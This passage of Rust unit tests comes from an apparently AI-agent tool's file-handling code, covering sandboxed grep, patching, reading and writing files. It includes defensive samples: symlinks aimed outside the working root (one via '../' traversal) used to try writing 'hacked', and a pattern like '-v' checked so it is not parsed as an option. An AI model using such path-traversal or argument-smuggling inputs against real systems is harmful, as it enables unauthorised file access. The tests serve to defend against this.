        std::fs::write(dir.0.join("c.txt"), "x\n").unwrap();
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.clone());
        let out = tool_grep_unsandboxed(
            &r#"{"pattern": "x", "count": true, "paths": ["a.txt", "b.txt", "c.txt"]}"#.to_string(),
            &ctx,
        )
        .unwrap();
        assert!(out.contains("a.txt:2"), "{out}");
        assert!(out.contains("c.txt:1"), "{out}");
        assert!(
            !out.contains("b.txt"),
            "files without a match aren't listed: {out}"
        );
    }

    #[test]
    fn test_the_grep_sandbox_shows_only_the_working_directory() {
        let args = bwrap_search_args("/work/proj", "/usr/bin/rg", &["x".to_string()]);
        let joined = args.join(" ");
        assert!(joined.contains("--tmpfs /"), "{joined}");
        assert!(
            joined.contains("--ro-bind /work/proj /work/proj"),
            "{joined}"
        );
        // Nothing else of the filesystem but the system's binaries and
        // libraries: no home, no /etc.
        let bound: Vec<&str> = args
            .windows(3)
            .filter(|w| w[0].starts_with("--ro-bind"))
            .map(|w| w[1].as_str())
            .collect();
        assert!(
            bound
                .iter()
                .all(|p| ["/usr", "/lib", "/lib64", "/work/proj"].contains(p)),
            "{bound:?}"
        );
    }

    #[test]
    fn test_rg_search_args_maps_every_option() {
        let params = search_params(serde_json::json!({
            "pattern": "fn tool_",
            "glob": "*.rs",
            "case_insensitive": true,
            "fixed_strings": true,
            "context_lines": 50,
            "include_ignored": true
        }));
        let args = rg_search_args(&params, &["src".to_string()]);
        for expected in ["-i", "-F", "--no-ignore", "--hidden", "--no-config"] {
            assert!(
                args.contains(&expected.to_string()),
                "{expected} missing: {args:?}"
            );
        }
        let c = args.iter().position(|a| a == "-C").unwrap();
        assert_eq!(args[c + 1], "10", "context is capped");
        let g = args.iter().position(|a| a == "-g").unwrap();
        assert_eq!(args[g + 1], "*.rs");
        // The pattern can never be taken for an option, and the path comes
        // after "--".
        assert_eq!(&args[args.len() - 4..], ["-e", "fn tool_", "--", "src"]);
    }

    #[test]
    fn test_grep_search_args_excludes_generated_dirs_unless_asked() {
        let params = search_params(serde_json::json!({"pattern": "-v", "files_only": true}));
        let args = grep_search_args(&params, &[".".to_string()]);
        assert!(args.contains(&"-E".to_string()));
        assert!(args.contains(&"-l".to_string()));
        assert!(args.contains(&"--exclude-dir=target".to_string()));
        assert_eq!(&args[args.len() - 4..], ["-e", "-v", "--", "."]);

        let params = search_params(serde_json::json!({"pattern": "x", "include_ignored": true}));
        let args = grep_search_args(&params, &[".".to_string()]);
        assert!(!args.iter().any(|a| a.starts_with("--exclude-dir")));
    }

    #[test]
    fn test_bwrap_search_args_bind_cwd_read_only() {
        let args = bwrap_search_args("/proj", "/usr/bin/rg", &["-e".to_string(), "x".to_string()]);
        assert!(
            !args.contains(&"--bind".to_string()),
            "nothing writable: {args:?}"
        );
        let ro: Vec<_> = args
            .windows(3)
            .filter(|w| w[0] == "--ro-bind")
            .map(|w| w[1].clone())
            .collect();
        assert_eq!(ro, vec!["/usr", "/proj"]);
        assert!(args.contains(&"--unshare-net".to_string()));
        assert!(args.contains(&"--clearenv".to_string()));
        let chdir = args.iter().position(|a| a == "--chdir").unwrap();
        assert_eq!(args[chdir + 1], "/proj");
        assert_eq!(&args[args.len() - 4..], ["--", "/usr/bin/rg", "-e", "x"]);
    }

    #[test]
    fn test_bwrap_search_args_bind_a_program_outside_the_system_dirs() {
        let args = bwrap_search_args("/proj", "/home/me/.cargo/bin/rg", &[]);
        let ro: Vec<_> = args
            .windows(3)
            .filter(|w| w[0] == "--ro-bind")
            .map(|w| w[1].clone())
            .collect();
        assert_eq!(ro, vec!["/usr", "/proj", "/home/me/.cargo/bin/rg"]);
    }

    #[test]
    fn test_limit_lines_reports_what_was_left_out() {
        assert_eq!(limit_lines("a\nb\nc\n", 5), ("a\nb\nc\n".to_string(), 0));
        assert_eq!(limit_lines("a\nb\nc\n", 2), ("a\nb\n".to_string(), 1));
    }

    #[test]
    fn test_grep_tool_searches_a_directory_and_caps_results() {
        let dir = "_test_search_dir";
        let root = test_dir().join(dir);
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("sub")).unwrap();
        std::fs::write(root.join("a.rs"), "fn tool_one() {}\nfn other() {}\n").unwrap();
        std::fs::write(root.join("sub/b.rs"), "fn tool_two() {}\n").unwrap();
        std::fs::write(root.join("notes.md"), "tool_three\n").unwrap();

        // Sandboxed as in production when bubblewrap is installed.
        let sandboxed = latex_kitty::resolve_on_path("bwrap").is_some();
        let run = |params: serde_json::Value| {
            search_files(&params.to_string(), &test_ctx(), sandboxed).unwrap()
        };
        let out = run(serde_json::json!({"pattern": "fn tool_\\w+", "path": dir}));
        assert_eq!(out.lines().count(), 2, "{out}");
        assert!(out.contains("a.rs:1:fn tool_one() {}"), "{out}");
        assert!(out.contains("b.rs:1:fn tool_two() {}"), "{out}");

        let out = run(serde_json::json!({"pattern": "tool_", "path": dir, "glob": "*.md"}));
        assert!(out.contains("notes.md:1:tool_three"), "{out}");
        assert!(!out.contains("a.rs"), "{out}");

        let out = run(serde_json::json!({"pattern": "tool_", "path": dir, "max_results": 1}));
        assert!(out.contains("[2 more lines not shown"), "{out}");

        let out = run(serde_json::json!({"pattern": "nothing_matches_this", "path": dir}));
        assert_eq!(out, "No matches.");

        std::fs::remove_dir_all(&root).unwrap();
    }

    #[test]
    fn test_patch_file_schema_and_dispatch() {
        let tools = initialize_tools(false, None);
        let schema: serde_json::Value = serde_json::from_str(&tools["patch_file"].schema).unwrap();
        assert_eq!(schema["function"]["name"], "patch_file");
        assert_eq!(
            schema["function"]["parameters"]["required"],
            serde_json::json!(["path", "edits"])
        );
        assert_eq!(
            schema["function"]["parameters"]["properties"]["edits"]["items"]["required"],
            serde_json::json!(["new_content"])
        );

        let path = "_test_pf_dispatch.tmp";
        write_test_file(path, "before\n");
        let call = ToolCall {
            index: None,
            id: "call_1".to_string(),
            tool_type: "function".to_string(),
            function: FunctionCall {
                name: "patch_file".to_string(),
                arguments: serde_json::json!({
                    "path": path,
                    "edits": [{"old_content": "before", "new_content": "after"}]
                })
                .to_string(),
            },
        };
        let msg = tool_call(&tools, &call, &test_ctx()).unwrap();
        assert_eq!(msg.role, "tool");
        assert_eq!(msg.name.as_deref(), Some("patch_file"));
        assert!(msg.content.unwrap().contains("patched successfully"));
        assert_eq!(read_test_file(path), "after\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_malformed_params() {
        let ctx = test_ctx();
        for params in [
            "not json",
            r#"{"path": "x"}"#,
            r#"{"edits": []}"#,
            r#"{"path": "x", "edits": "nope"}"#,
            r#"{"path": "x", "edits": [{"old_content": "a"}]}"#,
        ] {
            assert!(
                tool_patch_file(&params.to_string(), &ctx).is_err(),
                "{}",
                params
            );
        }
    }

    #[test]
    fn test_patch_file_replace_all_not_found() {
        let path = "_test_pf_all_missing.tmp";
        write_test_file(path, "abc\n");
        let err = patch(
            path,
            serde_json::json!([{"old_content": "zzz", "new_content": "x", "replace_all": true}]),
        )
        .unwrap_err();
        assert!(err.to_string().contains("not found"));
        assert_eq!(read_test_file(path), "abc\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_replace_all_deletes() {
        let path = "_test_pf_all_delete.tmp";
        write_test_file(path, "a-b-c-d\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "-", "new_content": "", "replace_all": true}]),
        )
        .unwrap();
        assert_eq!(res["bytes_after"], 5);
        assert_eq!(read_test_file(path), "abcd\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_edits_that_cancel_out_write_nothing() {
        let path = "_test_pf_cancel.tmp";
        write_test_file(path, "one two\n");
        let res = patch(
            path,
            serde_json::json!([
                {"old_content": "one", "new_content": "1"},
                {"old_content": "1", "new_content": "one"}
            ]),
        )
        .unwrap();
        assert_eq!(res["edits_applied"], 2);
        assert_eq!(res["bytes_written"], 0);
        assert_eq!(read_test_file(path), "one two\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_same_length_edits_write_only_the_changed_span() {
        let path = "_test_pf_span.tmp";
        write_test_file(path, "AAAA----------------BBBB\n");
        let res = patch(
            path,
            serde_json::json!([
                {"old_content": "AAAA", "new_content": "aaaa"},
                {"old_content": "BBBB", "new_content": "bbbb"}
            ]),
        )
        .unwrap();
        // From the first to the last changed byte, not the whole file.
        assert_eq!(res["bytes_written"], 24);
        assert_eq!(read_test_file(path), "aaaa----------------bbbb\n");

        let res = patch(
            path,
            serde_json::json!([{"old_content": "aaaa", "new_content": "AAAA"}]),
        )
        .unwrap();
        assert_eq!(res["bytes_written"], 4);
        cleanup(path);
    }

    #[test]
    fn test_patch_file_growing_edit_writes_from_first_change_to_end() {
        let path = "_test_pf_grow_tail.tmp";
        write_test_file(path, "keep keep keep X tail\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "X", "new_content": "XYZ"}]),
        )
        .unwrap();
        assert_eq!(res["bytes_written"], 8);
        assert_eq!(read_test_file(path), "keep keep keep XYZ tail\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_multiline_and_crlf() {
        let path = "_test_pf_crlf.tmp";
        write_test_file(path, "fn a() {\r\n    1\r\n}\r\nfn b() {\r\n    2\r\n}\r\n");
        patch(
            path,
            serde_json::json!([{
                "old_content": "fn a() {\r\n    1\r\n}\r\n",
                "new_content": "fn a() {\r\n    42\r\n}\r\n"
            }]),
        )
        .unwrap();
        assert_eq!(
            read_test_file(path),
            "fn a() {\r\n    42\r\n}\r\nfn b() {\r\n    2\r\n}\r\n"
        );
        cleanup(path);
    }

    #[test]
    fn test_patch_file_empty_file_cannot_match() {
        let path = "_test_pf_empty.tmp";
        write_test_file(path, "");
        assert!(
            patch(
                path,
                serde_json::json!([{"old_content": "a", "new_content": "b"}])
            )
            .is_err()
        );
        assert_eq!(read_test_file(path), "");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_follows_symlink_inside_root() {
        let target = "_test_pf_sym_target.tmp";
        let link = "_test_pf_sym_link.tmp";
        write_test_file(target, "linked content\n");
        cleanup(link);
        std::os::unix::fs::symlink(target, test_dir().join(link)).unwrap();
        patch(
            link,
            serde_json::json!([{"old_content": "linked", "new_content": "patched"}]),
        )
        .unwrap();
        assert_eq!(read_test_file(target), "patched content\n");
        cleanup(link);
        cleanup(target);
    }

    #[test]
    fn test_patch_file_symlinks_cannot_escape_the_root() {
        let outside = std::env::temp_dir().join("_test_pf_symlink_outside.tmp");
        std::fs::write(&outside, "outside\n").unwrap();

        // Absolute and relative links pointing outside the working directory
        // are resolved relative to the root, never to the real filesystem.
        let abs_link = "_test_pf_abs_link.tmp";
        let rel_link = "_test_pf_rel_link.tmp";
        cleanup(abs_link);
        cleanup(rel_link);
        std::os::unix::fs::symlink(&outside, test_dir().join(abs_link)).unwrap();
        std::os::unix::fs::symlink(
            "../../../../../../../../../../tmp",
            test_dir().join(rel_link),
        )
        .unwrap();

        let edits = serde_json::json!([{"old_content": "outside", "new_content": "hacked"}]);
        assert!(patch(abs_link, edits.clone()).is_err());
        assert!(patch(rel_link, edits).is_err());
        assert_eq!(std::fs::read_to_string(&outside).unwrap(), "outside\n");

        cleanup(abs_link);
        cleanup(rel_link);
        let _ = std::fs::remove_file(&outside);
    }

    #[test]
    fn test_patch_file_large_file() {
        let path = "_test_pf_large.tmp";
        let line = "The quick brown fox jumps over the lazy dog.\n";
        let original = line.repeat(20_000);
        write_test_file(path, &original);
        let res = patch(
            path,
            serde_json::json!([
                {"old_content": "quick", "new_content": "slow", "replace_all": true},
                {"old_content": "lazy", "new_content": "energetic", "replace_all": true}
            ]),
        )
        .unwrap();
        assert_eq!(res["replacements"], 40_000);
        assert_eq!(
            read_test_file(path),
            "The slow brown fox jumps over the energetic dog.\n".repeat(20_000)
        );
        cleanup(path);
    }

    /// Where the file tools' tests work: a temp directory rather than the
    /// source tree, so their files never land there - not even when a test
    /// fails before cleaning up. Every test names its own files.
    fn test_dir() -> &'static std::path::Path {
        static DIR: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
        DIR.get_or_init(|| {
            let dir = std::env::temp_dir().join("faber_tests");
            std::fs::create_dir_all(&dir).unwrap();
            dir
        })
    }

    /// A tool context working in `test_dir()`.
    fn test_ctx() -> ToolContext {
        let mut ctx = ToolContext::new(|_| {});
        ctx.cwd = Some(test_dir().to_path_buf());
        ctx
    }

    fn write_test_file(name: &str, content: &str) {
        std::fs::write(test_dir().join(name), content).unwrap();
    }

    fn read_test_file(name: &str) -> String {
        std::fs::read_to_string(test_dir().join(name)).unwrap()
    }

    fn cleanup(name: &str) {
        let _ = std::fs::remove_file(test_dir().join(name));
    }

    /// A fresh, uniquely-named temp directory for a single test, so parallel
    /// tests (which all share one process, and so one working directory)
    /// never see each other's fixtures.
    struct TempTestDir(std::path::PathBuf);

    impl TempTestDir {
        fn new(label: &str) -> Self {
            let path = std::env::temp_dir().join(format!(
                "faber_test_{}_{}_{}",
                label,
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            ));
            let _ = std::fs::remove_dir_all(&path);
            std::fs::create_dir_all(&path).unwrap();
            Self(path)
        }

        fn path(&self, rel: &str) -> String {
            self.0.join(rel).to_string_lossy().to_string()
        }
    }

    impl Drop for TempTestDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    #[test]
    fn test_complete_chdir_path_lists_only_matching_directories() {
        let dir = TempTestDir::new("chdir_match");
        std::fs::create_dir_all(dir.path("project_alpha")).unwrap();
        std::fs::create_dir_all(dir.path("project_beta")).unwrap();
        std::fs::create_dir_all(dir.path("other")).unwrap();
        std::fs::write(dir.path("project_file.txt"), "not a directory").unwrap();

        let prefix = format!("{}/proj", dir.0.display());
        let candidates = complete_chdir_path(&prefix);

        assert_eq!(
            candidates,
            vec![
                format!("{}/project_alpha/", dir.0.display()),
                format!("{}/project_beta/", dir.0.display()),
            ]
        );
    }

    #[test]
    fn test_complete_chdir_path_hides_dotdirs_unless_asked_for() {
        let dir = TempTestDir::new("chdir_dotdirs");
        std::fs::create_dir_all(dir.path(".git")).unwrap();
        std::fs::create_dir_all(dir.path("visible")).unwrap();

        let all = complete_chdir_path(&format!("{}/", dir.0.display()));
        assert_eq!(all, vec![format!("{}/visible/", dir.0.display())]);

        let dotted = complete_chdir_path(&format!("{}/.g", dir.0.display()));
        assert_eq!(dotted, vec![format!("{}/.git/", dir.0.display())]);
    }

    #[test]
    fn test_complete_chdir_path_follows_directory_symlinks_but_not_file_ones() {
        let dir = TempTestDir::new("chdir_symlinks");
        std::fs::create_dir_all(dir.path("real_dir")).unwrap();
        std::fs::write(dir.path("real_file.txt"), "x").unwrap();
        std::os::unix::fs::symlink(dir.path("real_dir"), dir.path("dir_link")).unwrap();
        std::os::unix::fs::symlink(dir.path("real_file.txt"), dir.path("file_link")).unwrap();
        std::os::unix::fs::symlink(dir.path("does_not_exist"), dir.path("broken_link")).unwrap();

        let mut candidates = complete_chdir_path(&format!("{}/", dir.0.display()));
        candidates.sort();

        assert_eq!(
            candidates,
            vec![
                format!("{}/dir_link/", dir.0.display()),
                format!("{}/real_dir/", dir.0.display()),
            ]
        );
    }

    #[test]
    fn test_complete_chdir_path_scans_current_directory_when_no_slash() {
        // A bare name with no "/" at all (e.g. the very first Tab after
        // "/chdir ") must scan "." rather than erroring or scanning nothing.
        let name = format!("zzz_faber_test_chdir_cwd_marker_{}", std::process::id());
        std::fs::create_dir_all(&name).unwrap();

        // Prefix match on part of the name, same as a real in-progress Tab.
        let partial = &name[..name.len() - 3];
        let candidates = complete_chdir_path(partial);

        assert!(
            candidates.contains(&format!("{}/", name)),
            "expected {:?} to contain {}/",
            candidates,
            name
        );

        let _ = std::fs::remove_dir_all(&name);
    }

    fn read(params: serde_json::Value) -> Result<serde_json::Value, Box<dyn Error>> {
        tool_read_file(&params.to_string(), &test_ctx()).map(|r| serde_json::from_str(&r).unwrap())
    }

    #[test]
    fn test_read_file_full_content_reports_total_lines() {
        let path = "_test_rf_full.tmp";
        write_test_file(path, "one\ntwo\nthree\n");
        let res = read(serde_json::json!({"path": path})).unwrap();
        assert_eq!(res["content"], "one\ntwo\nthree\n");
        assert_eq!(res["total_lines"], 3);
        assert!(res.get("start_line").is_none());
        assert!(res.get("end_line").is_none());
        cleanup(path);
    }

    fn read_with_limit(params: serde_json::Value, max_chars: usize) -> serde_json::Value {
        let mut ctx = test_ctx();
        ctx.max_tool_output_chars = Some(max_chars);
        serde_json::from_str(&tool_read_file(&params.to_string(), &ctx).unwrap()).unwrap()
    }

    #[test]
    fn test_read_file_too_large_stops_at_a_line_and_says_where_to_continue() {
        let path = "_test_rf_too_large.tmp";
        // 100 lines of 10 characters each; a 400-char budget allows 300.
        let contents: String = (0..100).map(|i| format!("line {:04}\n", i)).collect();
        write_test_file(path, &contents);
        let res = read_with_limit(serde_json::json!({"path": path}), 400);
        assert_eq!(res["start_line"], 1);
        assert_eq!(res["end_line"], 30);
        assert_eq!(res["total_lines"], 100);
        assert!(res["content"].as_str().unwrap().ends_with("line 0029\n"));
        assert!(res["note"].as_str().unwrap().contains("start_line=31"));

        let res = read_with_limit(
            serde_json::json!({"path": path, "start_line": 31, "end_line": 100}),
            400,
        );
        assert_eq!(res["end_line"], 60);
        assert!(res["content"].as_str().unwrap().starts_with("line 0030\n"));
        assert!(res["note"].as_str().unwrap().contains("start_line=61"));
        cleanup(path);
    }

    #[test]
    fn test_lines_within_budget_always_makes_progress() {
        assert_eq!(lines_within_budget(&["a\n", "b\n", "c\n"], 4), 2);
        assert_eq!(lines_within_budget(&["a\n", "b\n"], 100), 2);
        assert_eq!(lines_within_budget(&["way too long\n", "b\n"], 3), 1);
    }

    #[test]
    fn test_read_file_missing_file_errors() {
        let res = read(serde_json::json!({"path": "_test_rf_missing.tmp"})).unwrap();
        assert!(res["content"].is_null());
        let error = res["error"].as_str().unwrap();
        assert!(error.contains("not found"));
        // The underlying OS reason, not just pathrs's generic wrapper
        // message ("openat2 one-shot open failed"), must come through.
        assert!(
            error.contains("No such file or directory"),
            "error message dropped the underlying cause: {}",
            error
        );
    }

    #[test]
    fn test_read_file_partial_range() {
        let path = "_test_rf_partial.tmp";
        write_test_file(path, "one\ntwo\nthree\nfour\nfive\n");
        let res = read(serde_json::json!({"path": path, "start_line": 2, "end_line": 4})).unwrap();
        assert_eq!(res["content"], "two\nthree\nfour\n");
        assert_eq!(res["total_lines"], 5);
        assert_eq!(res["start_line"], 2);
        assert_eq!(res["end_line"], 4);
        cleanup(path);
    }

    #[test]
    fn test_read_file_partial_range_single_line() {
        let path = "_test_rf_single.tmp";
        write_test_file(path, "one\ntwo\nthree\n");
        let res = read(serde_json::json!({"path": path, "start_line": 2, "end_line": 2})).unwrap();
        assert_eq!(res["content"], "two\n");
        cleanup(path);
    }

    #[test]
    fn test_read_file_partial_range_no_trailing_newline() {
        let path = "_test_rf_no_nl.tmp";
        write_test_file(path, "one\ntwo\nthree");
        let res = read(serde_json::json!({"path": path, "start_line": 3, "end_line": 3})).unwrap();
        assert_eq!(res["content"], "three");
        assert_eq!(res["total_lines"], 3);
        cleanup(path);
    }

    #[test]
    fn test_read_file_range_validation() {
        let path = "_test_rf_validate.tmp";
        write_test_file(path, "one\ntwo\nthree\n");

        // Line 0 is taken as the first.
        let res = read(serde_json::json!({"path": path, "start_line": 0, "end_line": 1})).unwrap();
        assert_eq!(res["content"], "one\n");

        let res = read(serde_json::json!({"path": path, "start_line": 3, "end_line": 1})).unwrap();
        assert!(res["error"].as_str().unwrap().contains("must be >="));

        // Starting past the end: nothing there, and where it ends.
        let res =
            read(serde_json::json!({"path": path, "start_line": 10, "end_line": 12})).unwrap();
        assert!(res["error"].is_null(), "{res}");
        assert_eq!(res["content"], "");
        assert!(
            res["note"].as_str().unwrap().contains("past its end"),
            "{res}"
        );

        // An end past the last line reads up to it, and says so.
        let res = read(serde_json::json!({"path": path, "start_line": 1, "end_line": 10})).unwrap();
        assert!(res["error"].is_null(), "{res}");
        let total = res["total_lines"].as_u64().unwrap();
        assert_eq!(res["end_line"].as_u64(), Some(total));
        assert!(res["note"].as_str().unwrap().contains("only"), "{res}");

        // One end only: to the end, or from the start.
        let res = read(serde_json::json!({"path": path, "start_line": 2})).unwrap();
        assert_eq!(res["content"], "two\nthree\n");
        let res = read(serde_json::json!({"path": path, "end_line": 1})).unwrap();
        assert_eq!(res["content"], "one\n");

        cleanup(path);
    }

    #[test]
    fn test_read_file_large_file_gets_a_note_suggesting_a_range() {
        let path = "_test_rf_large.tmp";
        let content = "line\n".repeat(LARGE_FILE_LINE_WARNING_THRESHOLD + 1);
        write_test_file(path, &content);

        let res = read(serde_json::json!({"path": path})).unwrap();
        assert_eq!(res["total_lines"], LARGE_FILE_LINE_WARNING_THRESHOLD + 1);
        assert!(res["note"].as_str().unwrap().contains("start_line"));

        cleanup(path);
    }

    #[test]
    fn test_read_file_small_file_gets_no_note() {
        let path = "_test_rf_small.tmp";
        write_test_file(path, "one\ntwo\nthree\n");
        let res = read(serde_json::json!({"path": path})).unwrap();
        assert!(res.get("note").is_none());
        cleanup(path);
    }

    #[test]
    fn test_read_file_partial_range_of_large_file_gets_no_note() {
        // The note only makes sense for a full read; a caller already using
        // a range doesn't need to be told to use one.
        let path = "_test_rf_large_ranged.tmp";
        let content = "line\n".repeat(LARGE_FILE_LINE_WARNING_THRESHOLD + 1);
        write_test_file(path, &content);
        let res = read(serde_json::json!({"path": path, "start_line": 1, "end_line": 2})).unwrap();
        assert!(res.get("note").is_none());
        cleanup(path);
    }

    #[test]
    fn test_format_bytes() {
        assert_eq!(format_bytes(0), "0 B");
        assert_eq!(format_bytes(512), "512 B");
        assert_eq!(format_bytes(1024), "1.0 KB");
        assert_eq!(format_bytes(238_218), "232.6 KB");
        assert_eq!(format_bytes(1024 * 1024), "1.0 MB");
        assert_eq!(format_bytes(1024 * 1024 * 1024), "1.0 GB");
    }

    #[test]
    fn test_patch_file_preview_shows_where_the_edit_landed() {
        let path = "_test_pf_preview_basic.tmp";
        write_test_file(
            path,
            "line one\nline two\nline three\nline four\nline five\nline six\nline seven\n",
        );
        let res = patch(
            path,
            serde_json::json!([{"old_content": "line five", "new_content": "LINE FIVE"}]),
        )
        .unwrap();
        let previews = res["previews"].as_array().unwrap();
        assert_eq!(previews.len(), 1);
        assert_eq!(previews[0]["start_line"], 5);
        assert_eq!(previews[0]["end_line"], 5);
        let snippet = previews[0]["snippet"].as_str().unwrap();
        assert!(snippet.contains("LINE FIVE"));
        assert!(snippet.contains("line four"));
        assert!(snippet.contains("line six"));
        assert!(!snippet.contains("line one"));
        cleanup(path);
    }

    #[test]
    fn test_patch_file_preview_multiline_replacement() {
        let path = "_test_pf_preview_multiline.tmp";
        write_test_file(path, "a\nb\nc\nd\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "b\nc", "new_content": "B\nC\nEXTRA"}]),
        )
        .unwrap();
        let previews = res["previews"].as_array().unwrap();
        assert_eq!(previews[0]["start_line"], 2);
        assert_eq!(previews[0]["end_line"], 4);
        cleanup(path);
    }

    #[test]
    fn test_patch_file_preview_accounts_for_earlier_edit_shifting_it() {
        // The second edit is textually before the first one in the file, so
        // applying it must shift the first edit's already-recorded preview
        // position by the resulting length difference.
        let path = "_test_pf_preview_shift.tmp";
        write_test_file(path, "header\nkeep\ntarget\nkeep\n");
        let res = patch(
            path,
            serde_json::json!([
                {"old_content": "target", "new_content": "TARGET"},
                {"old_content": "header", "new_content": "a much longer header line"}
            ]),
        )
        .unwrap();
        assert_eq!(
            read_test_file(path),
            "a much longer header line\nkeep\nTARGET\nkeep\n"
        );
        let previews = res["previews"].as_array().unwrap();
        // "TARGET" is still on line 3, even though the header edit (applied
        // second, but positioned earlier in the file) grew by 19 bytes.
        assert_eq!(previews[0]["start_line"], 3);
        assert_eq!(previews[0]["end_line"], 3);
        assert!(previews[0]["snippet"].as_str().unwrap().contains("TARGET"));
        assert_eq!(previews[1]["start_line"], 1);
        cleanup(path);
    }

    #[test]
    fn test_patch_file_preview_for_deletion() {
        let path = "_test_pf_preview_delete.tmp";
        write_test_file(path, "keep this\nremove this\nkeep this too\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "remove this\n", "new_content": ""}]),
        )
        .unwrap();
        let previews = res["previews"].as_array().unwrap();
        assert_eq!(previews.len(), 1);
        // Nothing left to show for an empty replacement; the snippet should
        // still center on the right place without panicking.
        let snippet = previews[0]["snippet"].as_str().unwrap();
        assert!(snippet.contains("keep this"));
        cleanup(path);
    }

    #[test]
    fn test_patch_file_preview_replace_all_has_one_entry() {
        let path = "_test_pf_preview_all.tmp";
        write_test_file(path, "x x x\n");
        let res = patch(
            path,
            serde_json::json!([{"old_content": "x", "new_content": "y", "replace_all": true}]),
        )
        .unwrap();
        let previews = res["previews"].as_array().unwrap();
        assert_eq!(previews.len(), 1);
        assert!(previews[0]["snippet"].as_str().unwrap().contains('y'));
        cleanup(path);
    }

    #[test]
    fn test_write_file_full_create() {
        let path = "_test_wf_full_create.tmp";
        cleanup(path);
        let params = serde_json::json!({
            "path": path,
            "content": "hello world\n"
        });
        let result = tool_write_file(&params.to_string(), &test_ctx()).unwrap();
        let res: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert_eq!(res["created"], true);
        assert_eq!(res["operation"], "create");
        assert_eq!(res["bytes_written"], 12);
        assert_eq!(read_test_file(path), "hello world\n");
        cleanup(path);
    }

    #[test]
    fn test_write_file_full_overwrite() {
        let path = "_test_wf_full_overwrite.tmp";
        write_test_file(path, "old content\n");
        let params = serde_json::json!({
            "path": path,
            "content": "new content\n"
        });
        let ctx = test_ctx();
        tool_read_file(&serde_json::json!({ "path": path }).to_string(), &ctx).unwrap();
        let result = tool_write_file(&params.to_string(), &ctx).unwrap();
        let res: serde_json::Value = serde_json::from_str(&result).unwrap();
        assert_eq!(res["created"], false);
        assert_eq!(res["operation"], "overwrite");
        assert_eq!(read_test_file(path), "new content\n");
        cleanup(path);
    }

    #[test]
    fn test_writes_are_refused_when_the_file_changed_since_it_was_read() {
        let path = "_test_wf_optimistic.tmp";
        write_test_file(path, "one\ntwo\n");
        let alice = test_ctx();
        let bob = test_ctx();
        let read = |ctx: &ToolContext| {
            tool_read_file(&serde_json::json!({ "path": path }).to_string(), ctx).unwrap();
        };
        let write = |ctx: &ToolContext, content: &str| {
            tool_write_file(
                &serde_json::json!({ "path": path, "content": content }).to_string(),
                ctx,
            )
        };
        let line_edit = |ctx: &ToolContext| {
            tool_patch_file(
                &serde_json::json!({"path": path, "edits": [{"start_line": 1, "end_line": 1, "new_content": "ONE"}]})
                    .to_string(),
                ctx,
            )
        };

        // Never read: refused, rather than overwriting it blind.
        let err = write(&alice, "x").unwrap_err().to_string();
        assert!(err.contains("haven't read it"), "{err}");

        // Both read it; Alice writes first; Bob's stale write is refused.
        read(&alice);
        read(&bob);
        write(&alice, "alice's version\n").unwrap();
        let err = write(&bob, "bob's version\n").unwrap_err().to_string();
        assert!(err.contains("changed since you read it"), "{err}");
        assert!(
            line_edit(&bob)
                .unwrap_err()
                .to_string()
                .contains("changed since you read it")
        );
        assert_eq!(read_test_file(path), "alice's version\n");
        // Alice's own later writes are fine: she saw what she wrote.
        write(&alice, "alice again\n").unwrap();
        // Text edits apply wherever the file has changed, read or not.
        let fresh = test_ctx();
        tool_patch_file(
            &serde_json::json!({"path": path, "edits": [{"old_content": "again", "new_content": "once more"}]})
                .to_string(),
            &fresh,
        )
        .unwrap();
        // Bob re-reads, and can write again.
        read(&bob);
        write(&bob, "bob's version\n").unwrap();
        cleanup(path);

        // A new file needs no read; a scheduled tool call isn't checked.
        let new_path = "_test_wf_optimistic_new.tmp";
        cleanup(new_path);
        tool_write_file(
            &serde_json::json!({ "path": new_path, "content": "hi" }).to_string(),
            &test_ctx(),
        )
        .unwrap();
        let mut scheduled = test_ctx();
        scheduled.file_versions = None;
        tool_write_file(
            &serde_json::json!({ "path": new_path, "content": "bye" }).to_string(),
            &scheduled,
        )
        .unwrap();
        cleanup(new_path);
    }

    #[test]
    fn test_write_file_refuses_partial_edit_parameters() {
        // An old-style partial edit must not be taken as a full write of
        // `content`, which would wipe the rest of the file.
        let path = "_test_wf_partial_refused.tmp";
        write_test_file(path, "keep\nme\n");
        let params = serde_json::json!({"path": path, "content": "x", "old_content": "me"});
        let err = tool_write_file(&params.to_string(), &test_ctx())
            .unwrap_err()
            .to_string();
        assert!(err.contains("patch_file"), "{err}");
        assert_eq!(read_test_file(path), "keep\nme\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_line_ranges() {
        let path = "_test_pf_lines.tmp";
        write_test_file(path, "one\ntwo\nthree\nfour\n");
        // Replace a line (keeping its line break), then - with line numbers
        // as they are after that - delete two, then a text edit.
        patch(
            path,
            serde_json::json!([
                {"start_line": 2, "end_line": 2, "new_content": "TWO"},
                {"start_line": 3, "end_line": 4, "new_content": ""},
                {"old_content": "one", "new_content": "ONE"}
            ]),
        )
        .unwrap();
        assert_eq!(read_test_file(path), "ONE\nTWO\n");

        // One line can become several.
        patch(
            path,
            serde_json::json!([{"start_line": 2, "end_line": 2, "new_content": "a\nb\n"}]),
        )
        .unwrap();
        assert_eq!(read_test_file(path), "ONE\na\nb\n");
        cleanup(path);
    }

    #[test]
    fn test_patch_file_line_range_errors_change_nothing() {
        let path = "_test_pf_lines_err.tmp";
        write_test_file(path, "a\nb\n");
        for (edit, expected) in [
            (
                serde_json::json!({"start_line": 0, "end_line": 1, "new_content": "x"}),
                "1-based",
            ),
            (
                serde_json::json!({"start_line": 2, "end_line": 1, "new_content": "x"}),
                "must be >=",
            ),
            (
